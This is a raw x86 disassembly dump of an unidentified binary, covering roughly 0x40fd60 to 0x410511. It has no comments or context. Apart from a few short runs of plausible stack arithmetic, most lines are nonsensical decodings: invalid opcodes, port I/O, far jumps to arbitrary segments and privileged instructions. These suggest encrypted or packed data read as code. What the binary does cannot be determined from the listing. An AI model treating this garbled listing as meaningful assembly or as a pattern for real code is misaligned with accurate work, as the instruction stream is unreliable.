  40fd60:	inc    esi
  40fd61:	cmp    BYTE PTR [ebx+0x2fd4b8f4],0xa2
  40fd68:	dec    ebx
  40fd69:	retf   0x9b63
  40fd6c:	push   eax
  40fd6d:	stos   BYTE PTR es:[edi],al
  40fd6e:	add    ebx,0xe04fa567
  40fd74:	jl     0x40fde8
  40fd76:	sbb    ecx,ecx
  40fd78:	out    0x23,eax
  40fd7a:	stos   DWORD PTR es:[edi],eax
  40fd7b:	int3   
  40fd7c:	xchg   edi,eax
  40fd7d:	out    0x6a,eax
  40fd7f:	mov    ?,WORD PTR [eax-0x4936103c]
  40fd85:	jae    0x40fd6c
  40fd87:	pop    edx
  40fd88:	adc    eax,0xf5d2d3c6
  40fd8d:	xor    esi,edx
  40fd8f:	test   al,0xba
  40fd91:	xor    eax,0x5dedc332
  40fd96:	xchg   dl,ah
  40fd98:	xchg   ebp,eax
  40fd99:	mov    eax,ds:0x7a7f83d7
  40fd9e:	loop   0x40fe12
  40fda0:	jnp    0x40fdb6
  40fda2:	lods   eax,DWORD PTR ds:[esi]
  40fda3:	inc    esp
  40fda4:	dec    esi
  40fda5:	(bad)  
  40fda6:	out    dx,al
  40fda7:	pop    edi
  40fda8:	inc    esp
  40fda9:	sar    BYTE PTR [ebx-0x58],cl
  40fdac:	xor    esp,DWORD PTR ds:0x9287f22a
  40fdb2:	call   0x2f36c7dc
  40fdb7:	add    eax,0x5d0e3e94
  40fdbc:	pop    esi
  40fdbd:	aad    0xd
  40fdbf:	cdq    
  40fdc0:	and    BYTE PTR [ebx-0xc],ch
  40fdc3:	imul   ebx,DWORD PTR [edi-0x32],0x65
  40fdc7:	sar    BYTE PTR [eax-0x4bd6eaae],cl
  40fdcd:	jnp    0x40fe0c
  40fdcf:	mov    ?,WORD PTR [ebx]
  40fdd1:	push   edi
  40fdd2:	cwde   
  40fdd3:	push   eax
  40fdd4:	pop    ss
  40fdd5:	xor    ecx,ebp
  40fdd7:	std    
  40fdd8:	pop    esp
  40fdd9:	outs   dx,DWORD PTR ds:[esi]
  40fdda:	aas    
  40fddb:	mov    edx,0xbfa1bdbd
  40fde0:	mov    dl,0xee
  40fde2:	add    bh,BYTE PTR [edx]
  40fde4:	add    al,0xb8
  40fde6:	xchg   ebx,eax
  40fde7:	inc    ebp
  40fde8:	or     eax,ecx
  40fdea:	mov    ecx,DWORD PTR [ebp-0x20]
  40fded:	mov    ecx,DWORD PTR [ebp-0x1c]
  40fdf0:	and    edx,0x76f2
  40fdf6:	or     edx,edi
  40fdf8:	xor    edx,esi
  40fdfa:	xor    eax,0x253b
  40fdff:	shld   edx,eax,0x2
  40fe03:	shl    eax,0x2
  40fe06:	shr    ecx,0x1e
  40fe09:	xor    esi,esi
  40fe0b:	or     eax,ecx
  40fe0d:	or     edx,esi
  40fe0f:	xor    eax,0xcb79b576
  40fe14:	mov    DWORD PTR [ebp-0x20],eax
  40fe17:	mov    esi,0x9c2b8ae8
  40fe1c:	xor    edx,esi
  40fe1e:	mov    DWORD PTR [ebp-0x1c],edx
  40fe21:	mov    eax,DWORD PTR [ebp-0x38]
  40fe24:	mov    ecx,DWORD PTR [ebp-0x34]
  40fe27:	mov    edx,DWORD PTR [ebp-0x40]
  40fe2a:	mov    edi,DWORD PTR [ebp-0x3c]
  40fe2d:	push   edi
  40fe2e:	push   edx
  40fe2f:	push   ecx
  40fe30:	push   eax
  40fe31:	call   0x41594e
  40fe36:	add    eax,0x536a
  40fe3b:	adc    edx,0x9573
  40fe41:	push   0x12613
  40fe46:	push   0xae21daec
  40fe4b:	push   edx
  40fe4c:	push   eax
  40fe4d:	call   0x422239
  40fe52:	mov    ecx,eax
  40fe54:	mov    eax,DWORD PTR [ebp-0x20]
  40fe57:	mov    ebx,DWORD PTR [ebp-0x1c]
  40fe5a:	xor    ecx,0x1b8b
  40fe60:	xor    edi,edi
  40fe62:	xor    edx,edi
  40fe64:	add    ecx,eax
  40fe66:	mov    eax,DWORD PTR [ebp+0xc]
  40fe69:	adc    edx,ebx
  40fe6b:	mov    DWORD PTR [eax],ecx
  40fe6d:	mov    DWORD PTR [eax+0x4],edx
  40fe70:	mov    eax,DWORD PTR [ebp-0x30]
  40fe73:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fe76:	mov    edx,0xbdb2
  40fe7b:	sub    edx,eax
  40fe7d:	jmp    0x410231
  40fe82:	(bad)  
  40fe83:	out    dx,eax
  40fe84:	ins    BYTE PTR es:[edi],dx
  40fe85:	and    BYTE PTR [esp+edi*4+0x3f7f08b],bh
  40fe8c:	or     bh,0xc3
  40fe8f:	or     esi,DWORD PTR [esi]
  40fe91:	xchg   edx,eax
  40fe92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe93:	sub    al,0xbe
  40fe95:	mov    esi,0xbebec4e3
  40fe9a:	add    al,al
  40fe9c:	stos   BYTE PTR es:[edi],al
  40fe9d:	fsubr  st(2),st
  40fe9f:	lea    ebp,[ecx-0x53]
  40fea2:	dec    ebx
  40fea3:	bound  edx,QWORD PTR [ebp-0x36]
  40fea6:	push   0xc8a706ff
  40feab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feac:	(bad)  
  40fead:	loope  0x40ff12
  40feaf:	leave  
  40feb0:	daa    
  40feb1:	adc    al,0xc5
  40feb3:	imul   cl
  40feb5:	xchg   esp,eax
  40feb6:	cmp    DWORD PTR [ecx-0x21990e2b],edx
  40febc:	sbb    ebp,ebx
  40febe:	adc    BYTE PTR [ebx+0x34],0xee
  40fec2:	and    ch,cl
  40fec4:	adc    BYTE PTR [edx],ch
  40fec6:	dec    edi
  40fec7:	daa    
  40fec8:	lss    ecx,FWORD PTR [esi+0xafc4bb6]
  40fecf:	sub    BYTE PTR fs:[ebx-0x28],dh
  40fed3:	pop    edi
  40fed4:	xchg   esi,eax
  40fed5:	aam    0xd6
  40fed7:	cmp    BYTE PTR [ecx],dl
  40fed9:	push   cs
  40feda:	pusha  
  40fedb:	ror    BYTE PTR [edi],0xfd
  40fede:	xor    BYTE PTR [edx+0x31],0x26
  40fee2:	aas    
  40fee3:	inc    ecx
  40fee4:	test   eax,0x2c680f26
  40fee9:	adc    al,BYTE PTR [edi+0x4dbadb1]
  40feef:	push   ebp
  40fef0:	pop    ss
  40fef1:	adc    BYTE PTR [edi+0x46688c1a],dl
  40fef7:	mov    eax,0xbc94aa55
  40fefc:	push   ss
  40fefd:	cmp    BYTE PTR [esi-0x3b],ch
  40ff00:	jmp    0x9b01:0x9a72e786
  40ff07:	call   0xa172:0x986954a3
  40ff0e:	xchg   esi,eax
  40ff0f:	cli    
  40ff10:	sbb    al,BYTE PTR [ebp-0x48]
  40ff13:	mov    edx,0x513c7d2a
  40ff18:	jnp    0x40ff5d
  40ff1a:	xor    al,0xd3
  40ff1c:	es mov al,0xfb
  40ff1f:	mov    ch,0xbf
  40ff21:	and    esp,DWORD PTR [eax+0x7b0b04b]
  40ff27:	sub    DWORD PTR [ebp+0x5cb62413],ebx
  40ff2d:	inc    edx
  40ff2e:	mov    al,0xf7
  40ff30:	jp     0x40feda
  40ff32:	xor    BYTE PTR [esp+eiz*2],al
  40ff35:	fwait
  40ff36:	aaa    
  40ff37:	push   edi
  40ff38:	jns    0x40fece
  40ff3a:	or     al,BYTE PTR [ebx-0x3b730b5e]
  40ff40:	mov    dh,0xeb
  40ff42:	clc    
  40ff43:	mov    ecx,0x9d0a4e41
  40ff48:	js     0x40ffa8
  40ff4a:	push   ss
  40ff4b:	int3   
  40ff4c:	loop   0x40fed5
  40ff4e:	lock add al,0x82
  40ff51:	sti    
  40ff52:	mov    ?,WORD PTR [ecx]
  40ff54:	mov    eax,ds:0x735cb15a
  40ff59:	sub    BYTE PTR [ebx+0x6a],ah
  40ff5c:	fisubr WORD PTR [ebp+0x74ee0007]
  40ff62:	popf   
  40ff63:	outs   dx,BYTE PTR ds:[esi]
  40ff64:	cmp    DWORD PTR [edi+0x33],ebx
  40ff67:	lods   eax,DWORD PTR ds:[esi]
  40ff68:	lahf   
  40ff69:	inc    ebp
  40ff6a:	add    DWORD PTR [ebp+0x58],eax
  40ff6d:	in     eax,0x98
  40ff6f:	lods   ax,WORD PTR ds:[esi]
  40ff71:	dec    ebx
  40ff72:	adc    BYTE PTR ds:0xbbcf59c3,al
  40ff78:	inc    esi
  40ff79:	fisubr DWORD PTR [ecx]
  40ff7b:	ins    DWORD PTR es:[edi],dx
  40ff7c:	das    
  40ff7d:	xor    DWORD PTR [esi+0x3b],esi
  40ff80:	xor    BYTE PTR [edi-0x1e],bh
  40ff83:	fisub  WORD PTR [esi-0x7e46bca3]
  40ff89:	xor    DWORD PTR ds:0x39922eca,0x9b669a5a
  40ff93:	xor    DWORD PTR [eax+0x4d63a853],edx
  40ff99:	dec    eax
  40ff9a:	or     BYTE PTR [ecx],al
  40ff9c:	ds jmp 0xac59778a
  40ffa2:	and    ch,BYTE PTR [esi-0x39ab5a64]
  40ffa8:	adc    bl,bl
  40ffaa:	aam    0x3b
  40ffac:	out    dx,al
  40ffad:	pop    ecx
  40ffae:	repnz aaa 
  40ffb0:	push   edi
  40ffb1:	out    dx,al
  40ffb2:	sbb    BYTE PTR [ebx+0x6c],cl
  40ffb5:	push   DWORD PTR [ebp+0x71]
  40ffb8:	mov    edi,esp
  40ffba:	nop
  40ffbb:	push   ebp
  40ffbc:	xor    dh,dl
  40ffbe:	mov    esi,0x565525bb
  40ffc3:	scas   eax,DWORD PTR es:[edi]
  40ffc4:	lods   eax,DWORD PTR ds:[esi]
  40ffc5:	mov    esi,0xa65f2a21
  40ffca:	adc    ebx,DWORD PTR [ecx+ebp*2]
  40ffcd:	(bad)
  40ffd0:	test   al,0x7f
  40ffd2:	ins    DWORD PTR es:[edi],dx
  40ffd3:	push   edx
  40ffd4:	add    edi,ecx
  40ffd6:	xchg   DWORD PTR [eax-0x3c5e7b41],esp
  40ffdc:	dec    edi
  40ffdd:	adc    al,0x7a
  40ffdf:	mov    WORD PTR [ecx+ecx*1],ss
  40ffe2:	mov    esp,0xd493501a
  40ffe7:	jo     0x410027
  40ffe9:	mov    dh,0x5e
  40ffeb:	push   ecx
  40ffed:	ins    DWORD PTR es:[edi],dx
  40ffee:	repnz adc DWORD PTR [esi],ebp
  40fff1:	or     al,0xad
  40fff3:	push   eax
  40fff4:	adc    eax,0xf6ee4351
  40fff9:	repnz loope 0x40ffa0
  40fffc:	outs   dx,BYTE PTR ds:[esi]
  40fffd:	call   0x3f3d18a5
  410002:	pop    ebx
  410003:	push   es
  410004:	or     eax,0x61e06b6d
  410009:	sbb    DWORD PTR ss:[ecx+0x49],esp
  41000d:	inc    eax
  41000e:	fidivr WORD PTR ds:0x18ae326f
  410014:	sub    bl,BYTE PTR [ebx-0x4fec9133]
  41001a:	outs   dx,BYTE PTR ds:[esi]
  41001b:	rol    BYTE PTR [ebp-0x3b],0x2b
  41001f:	sbb    eax,0xc2e41d70
  410024:	xchg   DWORD PTR [ecx-0x5b12d9d],ecx
  41002a:	sub    DWORD PTR [ebx-0x1967e0da],ecx
  410030:	mov    esp,0x96cef81
  410035:	(bad)  
  410036:	outs   dx,DWORD PTR ds:[esi]
  410037:	(bad)  
  410038:	out    dx,al
  410039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41003a:	(bad)  
  41003b:	ins    BYTE PTR es:[edi],dx
  41003c:	mov    ss,WORD PTR [esi+0x5b]
  41003f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410040:	addr16 loope 0x410022
  410043:	push   edx
  410044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410045:	popa   
  410046:	add    DWORD PTR [ebp-0x4bfb36ad],edx
  41004c:	mov    ch,cl
  41004e:	ds mov ch,0xf4
  410051:	mov    bl,0x52
  410053:	mov    BYTE PTR [edx],bh
  410055:	or     dh,ch
  410057:	mov    esi,0x1152cf22
  41005c:	call   0x2ad40b3c
  410061:	cdq    
  410062:	and    eax,0x5ad6a8e0
  410067:	lods   eax,DWORD PTR ds:[esi]
  410068:	jnp    0x410061
  41006a:	ins    DWORD PTR es:[edi],dx
  41006b:	sbb    eax,0x8f867d8f
  410070:	jmp    0x1fcee15
  410075:	nop
  410076:	mov    ah,0x4
  410078:	sbb    al,0x31
  41007a:	fs scas al,BYTE PTR es:[edi]
  41007c:	mov    edx,0xd33f88e5
  410081:	ret    0x6ad1
  410084:	jne    0x41007a
  410086:	std    
  410087:	jmp    0x4100bb
  410089:	mov    ah,0xc4
  41008b:	cmp    DWORD PTR [esi-0x48],esi
  41008e:	dec    eax
  41008f:	inc    ecx
  410090:	mov    BYTE PTR [edx],bl
  410092:	push   ss
  410093:	jno    0x4100da
  410095:	popf   
  410096:	jnp    0x4100e1
  410098:	fwait
  410099:	sub    DWORD PTR es:[ebx+0x79],0x7
  41009e:	inc    esp
  41009f:	sub    dh,ah
  4100a1:	fidiv  DWORD PTR [edx+ebx*8+0x16251f89]
  4100a8:	iret   
  4100a9:	ror    DWORD PTR [edx-0x68],1
  4100ac:	sub    DWORD PTR [ecx],ebp
  4100ae:	aam    0x8c
  4100b0:	(bad)  
  4100b1:	cmp    ah,BYTE PTR [ecx-0x70]
  4100b4:	inc    edi
  4100b5:	in     eax,dx
  4100b6:	rcl    DWORD PTR [ecx+ebp*8+0x18],0x2c
  4100bb:	adc    DWORD PTR [esi],esi
  4100bd:	aad    0x70
  4100bf:	inc    ebx
  4100c0:	mov    ecx,gs
  4100c2:	add    DWORD PTR [edx-0x3a],ebp
  4100c5:	inc    edx
  4100c6:	mov    WORD PTR ds:0x5588621d,es
  4100cc:	(bad)  
  4100cd:	popa   
  4100ce:	mov    bl,0xdb
  4100d0:	jns    0x410066
  4100d2:	call   0x1f8e:0xbcb28381
  4100d9:	or     al,0xed
  4100db:	in     eax,dx
  4100dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100dd:	push   ds
  4100de:	imul   esp,edi,0x2b69606d
  4100e4:	popf   
  4100e5:	xor    BYTE PTR [eax+ecx*1+0x6f],0x22
  4100ea:	xchg   esi,eax
  4100eb:	sbb    ebp,DWORD PTR [ecx]
  4100ed:	xor    ebx,DWORD PTR [edi+0x55b753f9]
  4100f3:	aaa    
  4100f4:	add    eax,esp
  4100f6:	fist   WORD PTR [edx+0x71b5ae78]
  4100fc:	xchg   ebx,esp
  4100fe:	imul   BYTE PTR [eax-0x7d]
  410101:	out    0x3e,eax
  410103:	xlat   BYTE PTR ds:[ebx]
  410104:	sub    eax,0x1e94e156
  410109:	dec    ebx
  41010a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41010b:	push   ss
  41010c:	mov    ecx,0x396ed71c
  410111:	push   eax
  410112:	push   eax
  410113:	in     eax,dx
  410114:	inc    eax
  410115:	sbb    DWORD PTR ds:0xfcc6a582,0xffffffd1
  41011c:	(bad)  
  41011d:	adc    DWORD PTR [ecx],esi
  41011f:	mov    edi,0xcd50bdc9
  410124:	mov    gs,esp
  410126:	sar    dl,cl
  410128:	and    al,0xdf
  41012a:	push   esp
  41012b:	push   ebx
  41012c:	or     DWORD PTR [ebp-0xf],edi
  41012f:	sbb    al,0x8c
  410131:	icebp  
  410132:	ror    BYTE PTR [esi-0x447e4d10],0x51
  410139:	(bad)  
  41013a:	outs   dx,BYTE PTR ds:[esi]
  41013b:	jp     0x4100fe
  41013d:	fwait
  41013e:	sub    dh,BYTE PTR [edi+0x6f6f5a64]
  410144:	test   BYTE PTR [esi],0x41
  410147:	xlat   BYTE PTR ds:[ebx]
  410148:	push   ebp
  410149:	in     al,dx
  41014a:	in     eax,0x5f
  41014c:	cmc    
  41014d:	push   es
  41014e:	lods   al,BYTE PTR ds:[esi]
  41014f:	loope  0x4101ce
  410151:	add    dl,BYTE PTR [ebx]
  410153:	jl     0x4101af
  410155:	addr16 bnd jb 0x4101c7
  410159:	div    DWORD PTR [edx-0x13ac4919]
  41015f:	mov    esp,0x94629360
  410164:	push   ss
  410165:	mov    ebp,0x8a3cd090
  41016a:	sbb    ecx,DWORD PTR [eax+eax*2+0x13]
  41016e:	(bad)  
  41016f:	pusha  
  410170:	fcomp  QWORD PTR [esi+eiz*1]
  410173:	xchg   esi,eax
  410174:	cmp    ah,dl
  410176:	rcr    BYTE PTR [eax],0x4a
  410179:	sbb    ecx,eax
  41017b:	mov    ah,0x51
  41017d:	mov    esp,0x72509062
  410182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410183:	ds test al,0xed
  410186:	(bad)  
  410187:	jno    0x410136
  410189:	fs pop es
  41018b:	xchg   ebp,eax
  41018c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41018d:	adc    eax,DWORD PTR [ebp-0x30]
  410190:	(bad)  
  410191:	je     0x4101a5
  410193:	dec    eax
  410194:	sbb    BYTE PTR [ecx+0x4],0x67
  410198:	out    dx,al
  410199:	jg     0x4101ae
  41019b:	scas   eax,DWORD PTR es:[edi]
  41019c:	sbb    eax,0x8d50f103
  4101a1:	icebp  
  4101a2:	xchg   DWORD PTR [ebx],ebx
  4101a4:	ds js  0x410156
  4101a7:	ja     0x4101b6
  4101a9:	inc    edi
  4101aa:	pop    edi
  4101ab:	mov    esp,0x4735e954
  4101b0:	push   0xa03576c1
  4101b5:	aam    0x5a
  4101b7:	lods   al,BYTE PTR ds:[esi]
  4101b8:	jnp    0x41017d
  4101ba:	pop    ds
  4101bb:	lock je 0x410227
  4101be:	dec    esp
  4101bf:	leave  
  4101c0:	ror    BYTE PTR [ebx+0x251397e7],cl
  4101c6:	dec    DWORD PTR [edi+ebp*1+0xeca9dc1]
  4101cd:	les    esi,FWORD PTR [edx-0x319059fd]
  4101d3:	out    dx,eax
  4101d4:	add    DWORD PTR [ebx],edi
  4101d6:	fsubp  st(1),st
  4101d8:	icebp  
  4101d9:	cmp    BYTE PTR [ecx],ah
  4101db:	mov    edx,esi
  4101dd:	pop    edx
  4101de:	cmp    BYTE PTR [eax-0x53],bh
  4101e1:	adc    BYTE PTR [eax+edi*8],ch
  4101e4:	mov    BYTE PTR [ecx+edi*8-0x25cd031a],al
  4101eb:	out    0x88,al
  4101ed:	shr    bh,1
  4101ef:	aam    0x25
  4101f1:	push   ebp
  4101f2:	test   eax,0xc3351ebf
  4101f7:	fmul   QWORD PTR [ebp+0x170cc704]
  4101fd:	add    BYTE PTR [ecx],ch
  4101ff:	pop    esp
  410200:	xor    eax,DWORD PTR [esi-0x1]
  410203:	js     0x41022a
  410205:	inc    edx
  410206:	in     al,0x16
  410208:	ret    0x31b4
  41020b:	dec    eax
  41020c:	mov    ds:0xa5eae47b,eax
  410211:	das    
  410212:	es push esi
  410214:	jle    0x410291
  410216:	jne    0x41025f
  410218:	dec    edi
  410219:	sub    esi,DWORD PTR [ebx-0x69]
  41021c:	shr    BYTE PTR [esp-0x78],0x3c
  410221:	sub    al,0xc
  410223:	cld    
  410224:	jnp    0x410242
  410226:	adc    cl,dh
  410228:	test   BYTE PTR [ebx-0x37fa605f],dh
  41022e:	ins    DWORD PTR es:[edi],dx
  41022f:	mov    eax,0xd8458b3e
  410234:	mov    ebx,0x4c02
  410239:	sbb    ebx,ecx
  41023b:	mov    ecx,DWORD PTR [ebp-0x24]
  41023e:	sub    edx,eax
  410240:	mov    eax,DWORD PTR [ebp+0xc]
  410243:	sbb    ebx,ecx
  410245:	add    edx,DWORD PTR [eax]
  410247:	mov    ecx,DWORD PTR [ebp-0x28]
  41024a:	adc    ebx,DWORD PTR [eax+0x4]
  41024d:	push   0x2
  41024f:	xor    ebx,esi
  410251:	mov    esi,DWORD PTR [ebp-0x24]
  410254:	pop    esi
  410255:	sub    esi,ecx
  410257:	mov    ecx,DWORD PTR [ebp-0x30]
  41025a:	sub    esi,ecx
  41025c:	mov    eax,ebx
  41025e:	jmp    0x410612
  410263:	sub    DWORD PTR [esi-0x65853526],eax
  410269:	cmp    DWORD PTR [esi-0x6df308e8],esp
  41026f:	add    al,0x2a
  410271:	xor    ch,bl
  410273:	leave  
  410274:	xor    al,0xbe
  410276:	mov    esi,0xbebec4e3
  41027b:	std    
  41027c:	inc    edi
  41027d:	jle    0x41020b
  41027f:	daa    
  410280:	and    edi,DWORD PTR [esi]
  410282:	cld    
  410283:	add    ch,BYTE PTR ds:0x648dedc4
  410289:	leave  
  41028a:	imul   edi,edi,0x37
  41028d:	ret    0x8cf9
  410290:	jmp    0x4102b8
  410292:	pop    ebp
  410293:	in     eax,0x51
  410295:	sti    
  410296:	lea    ebp,[ebx+0xc2a8b5d]
  41029c:	(bad)  
  41029d:	fs jecxz 0x41022f
  4102a0:	sahf   
  4102a1:	fwait
  4102a2:	rcl    BYTE PTR [eax+0x231bbe99],0x14
  4102a9:	sbb    eax,0xd56d3e4b
  4102ae:	mov    ch,0xa3
  4102b0:	outs   dx,BYTE PTR ds:[esi]
  4102b1:	sub    al,0xb9
  4102b3:	dec    ebx
  4102b4:	cmp    al,0x8f
  4102b6:	test   eax,0x945d33ab
  4102bb:	js     0x41031a
  4102bd:	test   eax,0x4f5e5110
  4102c2:	mov    dh,0x64
  4102c4:	(bad)  
  4102c5:	mov    ecx,0x120530a2
  4102ca:	jmp    0xf185:0x7d18c6dc
  4102d1:	xchg   BYTE PTR [edx],al
  4102d3:	cmp    al,0x51
  4102d5:	fsubrp st(4),st
  4102d7:	(bad)  [eax-0x9b2d161]
  4102dd:	xor    dh,BYTE PTR [ebp-0x50702c1f]
  4102e3:	jg     0x4102bd
  4102e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102e6:	scas   al,BYTE PTR es:[edi]
  4102e7:	sub    al,0xe
  4102e9:	leave  
  4102ea:	leave  
  4102eb:	out    dx,eax
  4102ec:	mov    al,0x8a
  4102ee:	mov    ecx,esi
  4102f0:	push   cs
  4102f1:	das    
  4102f2:	mov    esi,0x9731208b
  4102f7:	mov    eax,DWORD PTR [eax]
  4102f9:	mov    ch,0x17
  4102fb:	mov    edi,0xb5e415da
  410300:	and    al,0xa6
  410302:	dec    ebp
  410303:	pop    ecx
  410304:	pop    edi
  410305:	or     DWORD PTR [eax+ebx*8+0x7d],esi
  410309:	push   es
  41030a:	(bad)  
  41030b:	gs call 0x6c1e408e
  410311:	push   ebp
  410312:	cmp    bl,BYTE PTR [edi+ecx*4-0x418cc0ad]
  410319:	retf   0xf74d
  41031c:	xchg   esi,eax
  41031d:	add    DWORD PTR [eax-0x72],esp
  410320:	mov    esi,0x1de405c1
  410325:	mov    ebp,0xff4db21b
  41032a:	mov    ebp,0xf750e85e
  41032f:	mov    ebx,0xb9872e14
  410334:	in     al,0x4a
  410336:	hlt    
  410337:	jl     0x4102d2
  410339:	fbstp  TBYTE PTR [ebx+eiz*8]
  41033c:	stos   BYTE PTR es:[edi],al
  41033d:	cmp    dl,BYTE PTR [ecx]
  41033f:	sbb    BYTE PTR [esi+0x724f2aad],al
  410345:	outs   dx,BYTE PTR ds:[esi]
  410346:	add    dh,BYTE PTR [ebx+0x6a]
  410349:	fist   WORD PTR [ebp+ecx*1-0x66]
  41034d:	or     al,0xa4
  41034f:	stos   DWORD PTR es:[edi],eax
  410350:	mov    dh,0x9d
  410352:	div    BYTE PTR es:[ebp-0xd157612]
  410359:	mov    edx,0xacad6d02
  41035e:	les    ecx,FWORD PTR [eax-0x50]
  410361:	cdq    
  410362:	(bad)  
  410363:	or     eax,0xaf6ff579
  410368:	xor    ah,BYTE PTR [eax+ebp*1+0x45]
  41036c:	mov    cl,0x7
  41036e:	xor    BYTE PTR [ebp+ecx*1-0x7b5d2fe7],ah
  410375:	in     al,dx
  410376:	dec    ebx
  410377:	sub    ah,dh
  410379:	pop    edi
  41037a:	pop    ds
  41037b:	cmp    eax,0x53b1e08c
  410380:	adc    bl,BYTE PTR [ebx+0x56]
  410383:	xor    eax,0x78fe4b7e
  410388:	inc    ecx
  410389:	push   ebx
  41038a:	push   ecx
  41038b:	lods   eax,DWORD PTR ds:[esi]
  41038c:	lods   al,BYTE PTR ds:[esi]
  41038d:	sub    eax,0x24dba205
  410392:	lea    ecx,ds:[edi]
  410395:	pop    ebp
  410396:	adc    ebp,DWORD PTR [esi+0x18d4cda1]
  41039c:	(bad)  
  41039d:	mov    WORD PTR [eax],fs
  41039f:	shl    BYTE PTR [edi+ebx*1-0xca31b8a],cl
  4103a6:	test   bl,bh
  4103a8:	mov    al,0x73
  4103aa:	sbb    cl,BYTE PTR [ebx]
  4103ac:	or     dh,0xae
  4103af:	cmc    
  4103b0:	and    ecx,eax
  4103b2:	div    BYTE PTR [edi]
  4103b4:	imul   edi,DWORD PTR [esi+eiz*1-0x796fd0ca],0x5e
  4103bc:	push   edi
  4103bd:	or     dl,dh
  4103bf:	pusha  
  4103c0:	xchg   ebx,ebp
  4103c2:	xor    al,0x9d
  4103c4:	adc    al,BYTE PTR [ecx-0x53c73279]
  4103ca:	add    DWORD PTR [ecx],0xf667b59d
  4103d0:	mov    eax,DWORD PTR [eax-0x2c]
  4103d3:	ret    0x3ae1
  4103d6:	test   al,0x95
  4103d8:	xchg   esp,eax
  4103d9:	iret   
  4103da:	pop    eax
  4103db:	mov    ch,0xf1
  4103dd:	mov    BYTE PTR [edx+ebx*1-0x2c],bl
  4103e1:	pop    eax
  4103e2:	test   eax,0xf42c5f9
  4103e7:	mov    bl,0x82
  4103e9:	(bad)  
  4103ea:	fsub   DWORD PTR [edi]
  4103ec:	out    0x22,eax
  4103ee:	mov    dh,0x66
  4103f0:	sub    esp,DWORD PTR [edi-0x1132128]
  4103f6:	mov    DWORD PTR [esi-0x14d0238f],esp
  4103fc:	rcl    BYTE PTR [esi-0x20bd0231],0xa3
  410403:	hlt    
  410404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410405:	xchg   ebx,eax
  410406:	clc    
  410407:	pop    edx
  410408:	out    dx,al
  410409:	mov    ebx,0x82114156
  41040e:	fnstcw WORD PTR [esi+esi*1-0x7d]
  410412:	inc    ebp
  410413:	(bad)  
  410414:	jmp    0x9df8:0x1c518002
  41041b:	call   0xf7dc146a
  410420:	mov    ecx,?
  410422:	in     al,0xf5
  410424:	mov    eax,0xadb3e39a
  410429:	dec    ebx
  41042a:	or     ecx,esi
  41042c:	pop    es
  41042d:	xchg   ecx,eax
  41042e:	je     0x4103c6
  410430:	mov    BYTE PTR [esi-0x497d40b6],bl
  410436:	pop    edi
  410437:	ret    
  410438:	fnstcw WORD PTR ss:[ebx+0x5793ae54]
  41043f:	sub    DWORD PTR [ebp+esi*2+0x56],edi
  410443:	clc    
  410444:	push   0x4df34c55
  410449:	mov    ecx,DWORD PTR ds:0x5f39e241
  41044f:	xor    DWORD PTR [ebx+esi*8+0x19],edi
  410453:	cmc    
  410454:	daa    
  410455:	aas    
  410456:	dec    edx
  410457:	pop    ebx
  410458:	retf   
  410459:	adc    ebx,ebp
  41045b:	or     edi,DWORD PTR [edi+0x9]
  41045e:	jl     0x4103f5
  410460:	lods   al,BYTE PTR ds:[esi]
  410461:	sbb    al,0x9d
  410463:	inc    ecx
  410465:	cmp    edx,DWORD PTR [esi]
  410467:	jb     0x4104bc
  410469:	lods   al,BYTE PTR ds:[esi]
  41046a:	dec    ebp
  41046b:	pop    ss
  41046c:	add    cl,bh
  41046e:	push   0x58d860c6
  410473:	fcomp  DWORD PTR [edi+0x34]
  410476:	in     eax,dx
  410477:	sbb    eax,0x35bedd7
  41047c:	pop    edi
  41047d:	mov    al,ds:0x21e081d7
  410482:	adc    bl,BYTE PTR [ebp-0x658361ec]
  410488:	jo     0x410415
  41048a:	pushf  
  41048b:	pop    edi
  41048c:	das    
  41048d:	test   al,0x31
  41048f:	push   ds
  410490:	jno    0x4104f3
  410492:	sub    eax,0x13954c70
  410497:	xchg   ebp,eax
  410498:	mov    ecx,0x257d8595
  41049d:	pop    ebp
  41049e:	sbb    esi,DWORD PTR [ebx]
  4104a0:	jmp    0x98f:0x99b6a01f
  4104a7:	clc    
  4104a8:	test   al,0xca
  4104aa:	mov    cl,0xb7
  4104ac:	sbb    edi,DWORD PTR [eax-0x50]
  4104af:	and    BYTE PTR [eax],0xb0
  4104b2:	in     eax,dx
  4104b3:	pop    ecx
  4104b4:	fst    QWORD PTR [esi+0x5]
  4104b7:	mov    edx,0x2d44ff33
  4104bc:	pop    edi
  4104bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104be:	inc    ebp
  4104bf:	sub    DWORD PTR [esi-0x16],0x25
  4104c3:	imul   esi,ebx,0x75319f2b
  4104c9:	retf   0x9e1f
  4104cc:	lods   al,BYTE PTR ds:[esi]
  4104cd:	clc    
  4104ce:	scas   al,BYTE PTR es:[edi]
  4104cf:	mov    ecx,0x9b632bb
  4104d4:	mov    edx,0xfaefcbf4
  4104d9:	xor    BYTE PTR [edi],dh
  4104db:	mov    al,ds:0x851f5dbb
  4104e0:	jmp    0x48f:0xe3288721
  4104e7:	rol    BYTE PTR [edi-0x4a2c5bb3],1
  4104ed:	sahf   
  4104ee:	repnz dec ebp
  4104f0:	ins    DWORD PTR es:[edi],dx
  4104f1:	sub    ebx,DWORD PTR [ebx+0x363bcdbe]
  4104f7:	xor    al,0x73
  4104f9:	bound  edx,QWORD PTR [eax]
  4104fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104fc:	dec    ebx
  4104fd:	add    al,0xf
  4104ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410500:	icebp  
  410501:	add    eax,0x900f01f6
  410506:	data16 rol BYTE PTR [ebp-0x29],1
  41050a:	mov    al,BYTE PTR [esi-0x21]
  41050d:	xchg   edi,eax
  41050e:	repnz imul esi
  410511:	dec    ecx
